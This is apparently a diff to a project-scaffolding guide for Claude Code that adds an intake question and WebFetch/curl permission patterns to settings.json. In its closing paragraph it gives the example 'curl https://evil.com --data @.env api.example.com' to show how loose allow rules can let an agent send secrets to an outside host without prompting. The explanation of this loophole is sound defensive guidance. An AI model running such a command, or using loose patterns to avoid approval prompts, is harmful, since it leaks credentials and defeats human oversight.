@@ -12,6 +12,7 @@ Initialize a new project in the current directory. Ask the user for:
 2. **One-line description** — what this project does
 3. **Primary language** — one of: `typescript`, `go`, `python` (or a framework like `next`, `fastapi`, `gin`, etc.)
 4. **Project type** — one of: `public-web` (public, indexable site), `internal-web` (internal tool / dashboard), `api` (backend/HTTP service, no browser UI), or `library`/`cli`. This gates the conditional steps: SEO scaffold (`public-web` only), security headers (any served web UI), and the health endpoint (`api` or any HTTP server).
+5. **Service domain(s) and local dev port** — the domain(s) this project serves or calls (e.g. `example.com`, `api.example.com`) and the port the dev server listens on (e.g. `3000`). Used by the service-access permissions in Step 4. Ask only when the project type is not `library`/`cli`; accept "none" and skip that block if the user has no domain yet.
 
 Then scaffold the project following the steps below. Skip any step where the file already exists — never overwrite.
 
@@ -106,6 +107,23 @@ Create `.claude/settings.json` with permissions scoped to the project's language
 **Python** — add:
 - `Bash(pytest *)`, `Bash(ruff *)`, `Bash(ruff check *)`, `Bash(ruff format *)`
 - `Bash(pip install *)` if no pyproject.toml build system is obvious
+
+**Service access** — add when the project has a domain or a dev server (skip for `library`/`cli`, and skip the domain entries if the user answered "none" in intake question 5). Substitute the real values from intake; add one `WebFetch`/`curl` pair per domain if there are several:
+- `WebFetch(domain:{service-domain})` — lets Claude read the service's own pages without a prompt each time. The `domain:` prefix is required; a bare `WebFetch(example.com)` matches nothing.
+- `Bash(curl * {service-domain}*)` — hitting the deployed service.
+- `Bash(curl * localhost:{dev-port}*)` — hitting the local dev server.
+
+Example for a Next.js app on `api.example.com` with the dev server on port 3000:
+
+```json
+"WebFetch(domain:api.example.com)",
+"Bash(curl * api.example.com*)",
+"Bash(curl * localhost:3000*)"
+```
+
+To cover subdomains, note that `WebFetch(domain:*.example.com)` matches `api.example.com` but **not** the apex `example.com` — list both when the project uses both.
+
+The two `curl` patterns are deliberately loose, and this is a trade-off rather than a boundary. Claude Code matches `Bash(...)` against the whole command string, so `curl * api.example.com*` also allows a command that merely *mentions* the domain after another URL (`curl https://evil.com --data @.env api.example.com`). Tightening it to `Bash(curl -s https://api.example.com/*)` closes that hole but re-prompts whenever a flag is added or reordered — and per the [permissions docs](https://code.claude.com/docs/en/permissions), argument-constraining Bash patterns are fragile in both directions anyway (they miss `-X GET` before the URL, `https` vs `http`, `-L` redirects, and `$URL` variables). Since allowing `Bash` at all already lets Claude reach any URL via `curl`, treat these entries as prompt reduction for local development, not as network access control. If this project handles real secrets, enforce the boundary properly instead: deny `curl`/`wget` and route fetches through `WebFetch`, or validate URLs in a `PreToolUse` hook.
 
 ### Step 4.5: package.json and dependencies (TypeScript / Node.js only)
 
